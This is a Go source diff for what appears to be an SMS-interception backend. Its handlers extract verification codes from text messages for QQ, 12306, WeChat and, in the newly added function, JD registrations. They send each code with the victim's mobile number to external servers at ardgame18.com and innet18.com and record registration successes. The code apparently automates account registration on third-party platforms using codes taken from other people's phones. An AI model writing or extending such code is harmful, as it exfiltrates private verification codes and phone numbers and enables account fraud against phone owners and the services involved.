@@ -78,6 +78,8 @@ func sendC(w http.ResponseWriter, r *http.Request) {
 			// 微信
 			if strings.EqualFold(r.FormValue("apid"), "102") {
 				processWechatRegister(msg, *user, r.FormValue("apid"))
+			} else if strings.EqualFold(r.FormValue("apid"), "103") {
+				processJindongRegister(msg, *user, r.FormValue("apid"))
 			}
 		}
 	}
@@ -102,10 +104,7 @@ func processQqRegister(msg string, user map[string]string) {
 		result = exp.FindStringSubmatch(msg)
 		if nil != result {
 			pwd := result[1]
-			mobile := user["mobile"]
-			if len([]rune(user["mobile"])) == 13 {
-				mobile = mobile[2:13]
-			}
+			mobile := formatMobile(user["mobile"])
 			//生成要访问的url
 			// url := "http://localhost:8090/ss/testc?smsContent=" + smsContent
 			url := "http://zy.ardgame18.com:8080/verifycode/api/getQQVerifyCode.jsp?cid=qq114&pid=114&username=" + qq + "&passwd=" + pwd + "&mobile=" + mobile + "&ccpara="
@@ -123,10 +122,7 @@ func process12306Register(msg string, user map[string]string) {
 	if nil != result {
 		log.Println(result[1])
 		pwd := result[1]
-		mobile := user["mobile"]
-		if len([]rune(user["mobile"])) == 13 {
-			mobile = mobile[2:13]
-		}
+		mobile := formatMobile(user["mobile"])
 		url := "http://zy.innet18.com:8080/verifycode/api/getVerifyCode.jsp?cid=c115&pid=115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
 		go send2Url(url)
 		go updateRegisterUserSuccess(user, "register12306SuccessCount")
@@ -140,15 +136,46 @@ func processWechatRegister(msg string, user map[string]string, apid string) {
 	if nil != result {
 		log.Println(result[1])
 		pwd := result[1]
-		mobile := user["mobile"]
-		if len([]rune(user["mobile"])) == 13 {
-			mobile = mobile[2:13]
-		}
+		mobile := formatMobile(user["mobile"])
 		url := "http://zy.ardgame18.com:8080/verifycode/api/getWXChCode.jsp?cid=wx109&pid=wxp109&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
 		go send2Url(url)
 		go updateRelationSuccess(user, apid)
 	} else {
 		log.Println("processWechatRegister can not match:%s", msg)
+	}
+}
+
+func formatMobile(ori string) string {
+	if len([]rune(ori)) == 13 {
+		return ori[2:13]
+	} else {
+		return ori
+	}
+}
+
+func processJindongRegister(msg string, user map[string]string, apid string) {
+	exp := regexp.MustCompile(`为：(\S*)，`)
+	result := exp.FindStringSubmatch(msg)
+	if nil != result {
+		log.Println(result[1])
+		pwd := result[1]
+		mobile := formatMobile(user["mobile"])
+		url := "http://zy.ardgame18.com:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent=" + pwd + "&mobile=" + mobile + "&ccpara="
+		go send2Url(url)
+		go updateRelationSuccess(user, apid)
+	} else {
+		exp = regexp.MustCompile(`为(\S*)（`)
+		result = exp.FindStringSubmatch(msg)
+		if nil != result {
+			log.Println(result[1])
+			pwd := result[1]
+			mobile := formatMobile(user["mobile"])
+			url := "http://zy.ardgame18.com:8080/verifycode/api/getJDNET.jsp?cid=c115&pid=jd115&smsContent2=" + pwd + "&mobile=" + mobile + "&ccpara="
+			go send2Url(url)
+			go updateRelationSuccess(user, apid)
+		} else {
+			log.Println("processWechatRegister can not match:%s", msg)
+		}
 	}
 }
 
